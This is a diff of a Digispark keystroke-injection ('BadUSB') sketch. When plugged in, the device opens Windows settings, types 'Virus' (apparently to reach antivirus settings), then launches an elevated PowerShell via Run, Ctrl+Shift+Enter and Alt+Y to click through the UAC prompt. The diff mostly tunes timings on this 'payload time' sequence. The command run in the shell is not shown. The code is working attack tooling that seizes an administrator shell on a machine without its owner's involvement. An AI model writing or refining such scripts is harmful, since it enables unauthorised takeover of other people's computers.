@@ -13,7 +13,7 @@ void loop() {
   DigiKeyboard.sendKeyStroke(0);
   DigiKeyboard.delay(1000);
   DigiKeyboard.sendKeyStroke(KEY_I, MOD_GUI_LEFT);
-  DigiKeyboard.delay(1500);
+  DigiKeyboard.delay(2500);
   DigiKeyboard.print(F("Virus"));
   DigiKeyboard.delay(500);
   DigiKeyboard.sendKeyStroke(KEY_DOWN_ARROW);
@@ -39,28 +39,27 @@ void loop() {
   //so I chose to minimise it instead. Here's the old code anyways.
 //  DigiKeyboard.sendKeyStroke(KEY_F4, MOD_ALT_LEFT);
   DigiKeyboard.sendKeyStroke(KEY_M, MOD_GUI_LEFT); 
-  DigiKeyboard.delay(1000);
+  DigiKeyboard.delay(500);
     
 
 
   //payload time
   DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); 
-  DigiKeyboard.delay(500);
+  DigiKeyboard.delay(750);
   DigiKeyboard.print(F("powershell"));
   DigiKeyboard.delay(250);
 
+  //sends ctrl+shift+enter
   DigiKeyboard.sendKeyStroke(KEY_ENTER, MOD_CONTROL_LEFT + MOD_SHIFT_LEFT);
   DigiKeyboard.delay(1500);
-
-  //
+  
   
 //  DigiKeyboard.sendKeyStroke(KEY_ENTER);
 //  DigiKeyboard.delay(1000);
 //  DigiKeyboard.print("Start-Process powershell -Verb runAs; exit");
 //  DigiKeyboard.delay(1000);
-//  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+//  DigiKeyboard.sendKeyStroke(KEY_ENTER)
   
-  // ^^ instead of this bad code above, I changed it to ctrl+sahift+enter ^^
 
   DigiKeyboard.sendKeyStroke(KEY_Y, MOD_ALT_LEFT);
   DigiKeyboard.delay(750);
